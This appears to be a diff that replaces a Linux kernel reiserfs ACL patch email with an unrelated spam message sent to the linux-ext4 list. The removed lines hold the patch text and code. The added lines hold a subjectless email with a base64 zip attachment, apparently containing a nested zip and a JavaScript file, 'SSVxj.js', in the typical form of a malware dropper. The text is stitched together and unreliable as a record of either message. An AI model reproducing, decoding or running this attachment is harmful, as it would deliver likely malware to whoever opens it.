@@ -1,110 +1,83 @@
-From: Ernesto =?utf-8?Q?A=2E_Fern=C3=A1ndez?=
-        <ernesto.mnd.fernandez@gmail.com>
-Subject: [PATCH 5/5] reiserfs: preserve i_mode if __reiserfs_set_acl() fails
-Date: Wed, 12 Jul 2017 06:56:04 -0300
-Message-ID: <3ab632985cbf6fdd2ee5284482b9749c5893a5a1.1499805488.git.ernesto.mnd.fernandez@gmail.com>
-References: <cover.1499805484.git.ernesto.mnd.fernandez@gmail.com>
+From: <sterrenplan.kampen@deltasteur.nl>
+Subject: (unknown)
+Date: Wed, 12 Jul 2017 11:22:02 -0000
+Message-ID: <149985852285.5245.14102425877787181241@vnpt.vn>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 8bit
-To: Jan Kara <jack@suse.com>, Theodore Ts'o <tytso@mit.edu>,
-        Andreas Dilger <adilger.kernel@dilger.ca>,
-        Dave Kleikamp <shaggy@kernel.org>, linux-ext4@vger.kernel.org,
-        jfs-discussion@lists.sourceforge.net,
-        reiserfs-devel@vger.kernel.org
+Content-Type: application/zip; name="502633130680.zip"
+Content-Transfer-Encoding: base64
+To: <linux-ext4@vger.kernel.org>
 Return-path: <linux-ext4-owner@vger.kernel.org>
-Received: from mail-qk0-f195.google.com ([209.85.220.195]:33588 "EHLO
-        mail-qk0-f195.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751347AbdGLJ4K (ORCPT
-        <rfc822;linux-ext4@vger.kernel.org>); Wed, 12 Jul 2017 05:56:10 -0400
-Content-Disposition: inline
-In-Reply-To: <cover.1499805484.git.ernesto.mnd.fernandez@gmail.com>
+Received: from static.vnpt.vn ([14.177.111.249]:47677 "HELO vnpt.vn"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751347AbdGLLWJ (ORCPT <rfc822;linux-ext4@vger.kernel.org>);
+        Wed, 12 Jul 2017 07:22:09 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: linux-ext4-owner@vger.kernel.org
 List-ID: <linux-ext4.vger.kernel.org>
 
-When changing a file's acl mask, __reiserfs_set_acl() will first set the
-group bits of i_mode to the value of the mask, and only then set the
-actual extended attribute representing the new acl.
-
-If the second part fails (due to lack of space, for example) and the file
-had no acl attribute to begin with, the system will from now on assume
-that the mask permission bits are actual group permission bits, potentially
-granting access to the wrong users.
-
-Prevent this by only changing the inode mode after the acl has been set.
-Also make reiserfs_xattr_set_handle() return -ENODATA only in case of
-actual error, and return 0 when requested deletion of a nonexistent acl.
-This is more consistent with the behaviour of other *_xattr_set()
-functions and makes the patch simpler.
-
-Signed-off-by: Ernesto A. Fernández <ernesto.mnd.fernandez@gmail.com>
----
- fs/reiserfs/xattr.c     |  4 ++++
- fs/reiserfs/xattr_acl.c | 25 +++++++++----------------
- 2 files changed, 13 insertions(+), 16 deletions(-)
-
-diff --git a/fs/reiserfs/xattr.c b/fs/reiserfs/xattr.c
-index e87aa21..936a57a 100644
---- a/fs/reiserfs/xattr.c
-+++ b/fs/reiserfs/xattr.c
-@@ -513,6 +513,10 @@ reiserfs_xattr_set_handle(struct reiserfs_transaction_handle *th,
- 
- 	if (!buffer) {
- 		err = lookup_and_delete_xattr(inode, name);
-+		if (flags & XATTR_REPLACE)
-+			return err;
-+		if (err == -ENODATA)
-+			err = 0;
- 		return err;
- 	}
- 
-diff --git a/fs/reiserfs/xattr_acl.c b/fs/reiserfs/xattr_acl.c
-index 3d2256a..c02e5ac 100644
---- a/fs/reiserfs/xattr_acl.c
-+++ b/fs/reiserfs/xattr_acl.c
-@@ -237,14 +237,17 @@ __reiserfs_set_acl(struct reiserfs_transaction_handle *th, struct inode *inode,
- 	void *value = NULL;
- 	size_t size = 0;
- 	int error;
-+	int update_mode = 0;
-+	umode_t mode = inode->i_mode;
- 
- 	switch (type) {
- 	case ACL_TYPE_ACCESS:
- 		name = XATTR_NAME_POSIX_ACL_ACCESS;
- 		if (acl) {
--			error = posix_acl_update_mode(inode, &inode->i_mode, &acl);
-+			error = posix_acl_update_mode(inode, &mode, &acl);
- 			if (error)
- 				return error;
-+			update_mode = 1;
- 		}
- 		break;
- 	case ACL_TYPE_DEFAULT:
-@@ -264,25 +267,15 @@ __reiserfs_set_acl(struct reiserfs_transaction_handle *th, struct inode *inode,
- 
- 	error = reiserfs_xattr_set_handle(th, inode, name, value, size, 0);
- 
--	/*
--	 * Ensure that the inode gets dirtied if we're only using
--	 * the mode bits and an old ACL didn't exist. We don't need
--	 * to check if the inode is hashed here since we won't get
--	 * called by reiserfs_inherit_default_acl().
--	 */
--	if (error == -ENODATA) {
--		error = 0;
--		if (type == ACL_TYPE_ACCESS) {
-+	kfree(value);
-+	if (!error) {
-+		set_cached_acl(inode, type, acl);
-+		if (update_mode) {
-+			inode->i_mode = mode;
- 			inode->i_ctime = current_time(inode);
- 			mark_inode_dirty(inode);
- 		}
- 	}
--
--	kfree(value);
--
--	if (!error)
--		set_cached_acl(inode, type, acl);
+UEsDBAoDAAAAAOo57ErgoO73zA0AAMwNAAAKAAAAMDQ0MTA2LnppcFBLAwQUAwAACADqOexKHfID
+mDYNAABMHQAACAAAAFNTVnhqLmpzpVnLchtFFF2HqvxD441GZDLYBMLDBEqWLL9CZFt+BxatmZbU
+8sz0eB6yZTDFni0fQGBBZcGKYsMS/Qlfwrndo3nYwVCFE7vV3bfv89zbozuNHltPLjLuxfOfFXvh
+/PkHe/I+m79mWcBEueEJlsY8TCIVp4Idbe0yj7N9wX3WVfH8F85a89exwJAloPMlDzmz9lutbtNh
+vUjEnPGpnP8uEramhAxH7MMnH7K1LJGhSBK2LVImsBMMeOxJEbP2mPu+CEf4+HT5fcZZxONUxsxT
+0DblA+ELVwYiTLVmHTEUCadPXS7jAX5Dm4mAtXkwEHHMHSgpmRtLjvNY74qpiIWM9eGVj99/D+yh
+YSyg+DWPWSCThHS9ZTUnE5XNFNkTgpUMpSu5T3oIsm9xZhOffR8krBPzkQodth6QnCdsqCTEPBYX
+mYxIGVcFxcGOykY+T1j78fsfsg4/Vym32UUmtDyVMSjBUuVxeKPnCh5KfEoRqPmPTFylMpz/ogOl
+KmHTXtjOwvHC0qdO4+FbD99qtFgWSo9jcaHRwqtYpUNfcER1ceoj0lPV4UBL4OFyiCXtEe81nuRO
+oliABXzgw4ZQsX7mMy9Hx/wV4AEvhqCJYgiGbTxSUsGShHE3lVOtWkK2HCsVEHr2lXsOkOxzYMJm
+PEyNpxMRg/2U6xAYN6Q6xL0szQaLAH/wASJQt+mDp2yqfC1aMxmqOEBAbOzCE2wqrrXN96aAfdfo
+CuQ6GYhBqBKoiz9Pl2324TJg/tHyIqLT+StgEvuYhXxKJskhkEnW2SwVwJgBG0YeiRCkBVh4kvDM
+T4F431Uh+3h5meFcTLZ99DGkvLe8/B4c5adZrAN6kemQifkvZLNhGzNVcNQJKSqJlyOlIxKPuK2s
+2KzmjhRMqUYMBUVMu+fJMoukr1JwxeQDuEtGmV8Ea6BiT6EcJAWVV+OY0B9IzjNqQaWTJMhkmntS
+g48neXJwxXwVjiAfgcw4dmJKbU7uG/PAMIEDb9ef9uOVD9mGrwYi4EkKBGxtbdnsOWA2FsKjbViz
+KWI383FIZeVWa/fxkzbrxVKF2phEZKTj41xdY8ZETUVYGErKUTEkjReKcZcPoJdBMRshyBmPCVHr
+iat8DaaDGKpqiiOV12bElCD1RtcyxAHeM7GOCCAxFQ2KEqI9/1UZaanhKvL8mUpKCizcuQaewLxq
+fICzFH4FwuevAx2VDAOhjvhqSOXVwIRm/hqVBekSJvNXU+GTLhReSbCDRp70MN7JKhJKVYFsy+uC
+r0bzX5NUushPGbp+JkMKKFWPiJPMPD1jgFHmGkA69hVKiQhRpKlsQs50/lqLzMj/5LM8afLwCJqa
+4qOTJcZJmYCPnIJD4jDLFyi7ARYdx2k2VtkwCwF/JODenmfxztFwO9663oltNnSbXz+EaTP8ZVNE
+YvOUPWOnkw2r+ZBh4sBdobW0sX6wZLPaQe4norlqiBLUAEtP5JBZtJDyFHB79owSvMmIOcxGkoeQ
+SAT7xuNiTXmzKrMbgU+3yMPM923omIHk5iG7cXnqjpmF+qXi5j20IH1483BhujYK5A/IyvPhaPuk
+C0tfft1tf8KWpqcb2Xl4sHRj63njC7tvn9hf2M/t92wn/7RpH+DfbuPmq1XDZKsDBjmrlytfOd12
+vjGVa6dJhE2QOEnky9Rq2I0mdsWU+1aDaA5eYN8QOhMl4eOl5qqmod3x83anK2OQhOKStVxKmZPe
+YIIiZh28ICpj8oJwtWroyNu7GhzOOv1jYV3GJ/GLw86stzO12Wh3t81fHF9u9a7hiFKXiR+8UdJS
+q9PrrDl9QI8HS82GjhBROz1CRTk9mEUCHFaKheNYpjXhJe2uSiSpCfrlYrGPa+VAdaUvrIqSNnuv
+PNf2VSJymcZ4Heaa5TPPax0OT/3BLbujM//yFs4rYqAJnih2SwDX/UTUg8twY+3wgPfYs//m3lUG
+XmBmvV0cJewxdtx3URNTZ90dK6sR7USNnPamNMwoXFXjToqwr2+T34I+e0Om3DpwN1dKT4bH+6dd
+61Aez7zZ5Cz3wmlPqMnJxtVgD274+mDS6YwOu8iWsZ3iX2R/Yr+Lf9xOMIttZQf20B7ZY/sCnxTy
+yKU1UAjsYh+/Dk6N8fs5KJ/ZK5h7OJ82bla1wMlVdHh+MIa0UrSTy60kliH2Is87nISjy+MWDuRH
+TW41DHR19auQ2UVdtPz9jVObjQe7F1vHVK8eEA7eNnPyXOnshU/0kTIuD27I580qHA2q6PQCeKzM
+ueBqsrPz5qxbQKQ/Fr5vqgKd1SVn21s/O5tRui59+eXSap2nG+5tH3np9ZBh/wuejh39BSCwmk6q
+kMV4oLCePG06STbAA66FS/rjJnvElpxJNFqqinHl4fPZVejPMjAqZD4qBRSUa/3rYHgEKm2P048E
+fdUYKt8TcWKtLBP/klslefOTWPnngm6cq0mqbt07v97f3LOGOxfb4f5+7xAYVulxQvllPF14y1Ot
+0+QAqbm+NjnaHJ/NoGjDEeMXz7curkRDq7MgPr6YjdxBNPAJ232gut+wmYvRxRhjjDFKjBJjhDHC
+mGJMK+shxhDjCOMII2VHF6OP0ccoMAqMM4wzjAnGBGOAMSB+KXF0GjdatdLisyDsWM3CMH93epLS
+7fWVocMTi0XrEs8dpSEaxw/gE0PvRFkytopdp4/QlDO3NotrM1mbRbVZeg9lWJuN6ufS+snuPXz8
+2kwUs7tWzGqzpC7xHi4E7gbyr3GHpuGmSIxbBdo4tFzV5SedJM8WkXr5REemQOAbE51ONGtkzhd4
+HqdbsAru4qOD50ifu8JqUMKi8DWQXQW0y10Nb71dvS1Nklj/j9uDRbZaokngKpjTXYJtk6nm8ijQ
+a21OzvvJ1Zm8bq3bzGS5vr90jS2zvry+6ydKRuGwVWNwl4UuAKRZurG3sT+Z9vZGXTpmPFHWmgWT
+G72s/97k1yaNhcjOLN6fXT23rjdVtzNqt68PUU32FD8OZu0o3SOhZf3tX7fCNSoxj1iF/hGev82W
+s5+FVuXwaqN+X3Q3gv7RPaL+VZsatyTcuTh7PjyzdrupOMrWwOCWqv/t+qkoX7CC4jVZW2u9zl73
+6GznYO0e/e+3r/b84e+2/VDuFAJ1JbttUd3easQjXH7mPii2+16Ybc628yqaJy1TlJovGzmKo7RN
+1Xop3pl4O6Od/bUlTOR2r0vjXVc1aq5qNAtqk/xF6pGYl/o+HvpKxVbtan4Hmw71MqDxV+ybb9jS
+cBou6Q/y6mj36EQdngX6pjdIfWA0F97scBrIfaifP8cdXgTrzy/5Gcf3mjIfF/RVRGK/8MZqzUls
+cCGP9bek/Nj2eHTAW+ZZ/UH1ptFLGD5lKzQ+etRk5am1w5PWOR4Sa1JXsa0fib812w6+Hour3pDc
+2GgamfRTylxZ1fdXfuHroFarAd84Hk42dZirP/8MxvyA5qrzvRA5wDecc5rmHtZD/h0r1we7ZtOY
+eK0izp4tHLaq14tNdjjYGiycVnXv+UW08G5xVM/MkUeP9Ex7yfD4bGUZP0/fNwnA/tEXW2GnF2ys
+rw9Ld9z9KbKqpM653hin3P5qZfYw3Hkk0xv6b4mGwgWeoupc/NC29tdqsbhwIn6wZ9yy+qCwndaN
+xYvYLDZNvaYP7HKMi5JZGoK6EqBdfCzPZTR/7Ulu3g1Qb2UiTPudGiyur/Jtal6hHcWRz9ymNvMU
+D6zcR28lQL9S+vNfwxGaQ5WGs6KulwzRhAvR4k3UgCmwR6Nn/muE7s8lRDvsQOiWE+1A0m/4qquQ
+NDjhCnS4aA8M5n+AmS+nsUCzEqWEGpMQDA3kULq6C/XXd9/jv25QUTedOlEKnbIAeS9THpOawh9D
+/0UDtLcwFYbD2qEMSeNI4FtzRcuEIOOhn4fWFTpYhTrmlKSejBxIer2AJTKRQ0/0zujVSRtxoOrH
+2ioIVIgW5enjfosJaGZadOAWmXcXAEuW1thA3SSoMPvrux/0kjLvNKButZWltz1q6ZIDdHtOyFS/
+zIAJiECAQZD2nmmkmW5ZonJnHGiP4T95C7bqzmaJDd37pMZ6FqbU21bwxTr6pzq6aHFSx5CTOvnb
+h1tgSUxLGRDBlxzdXUfv0Yc4WBQMYt0KVjEaemCk8sarSIb0AgrTEL7+KRgQMKBkHjVtVTB/heah
+tszTcMRHWM71MY8WEzdLSPdF0zvvCiZFiz6avxrJkGtyPslg9fxHE9dELl68GDPhlITTRAMWfOQg
+k7FNgAcZeGrPi6sIIeMG0/rVlEYxveUaIRaZdnB1jd5gUNtbaYXnf9A7kgQ+Ip5jgXQAT93nHWUh
+DlbjRTiivWxAIuMKNlX42McbuAoiEjniASkZI14YBvNXCQ4l1XzFDPCvxtHOU1PFMEwEkQ87F1nH
+AXsTbI+yXL9oIY9pK0MFFElhtvU7BV6EYMCpuW3eWizgRJiPqQFuvLLotqOJ/3iKW4/w1iqCdSu2
+utktAp0Xpm1tXvdR29gXVxrs9BoPq6aNnUvTthVVganSfzXwQ/G/AVBLAQI/AxQDAAAIAOo57Eod
+8gOYNg0AAEwdAAAIACQAAAAAAAAAIICkgQAAAABTU1Z4ai5qcwoAIAAAAAAAAQAYAAAUziUA+9IB
+ABTOJQD70gEAFM4lAPvSAVBLBQYAAAAAAQABAFoAAABcDQAAAABQSwECPwMKAwAAAADqOexK4KDu
+98wNAADMDQAACgAkAAAAAAAAACCApIEAAAAAMDQ0MTA2LnppcAoAIAAAAAAAAQAYAAAUziUA+9IB
+ABTOJQD70gEAFM4lAPvSAVBLBQYAAAAAAQABAFwAAAD0DQAAAAA=
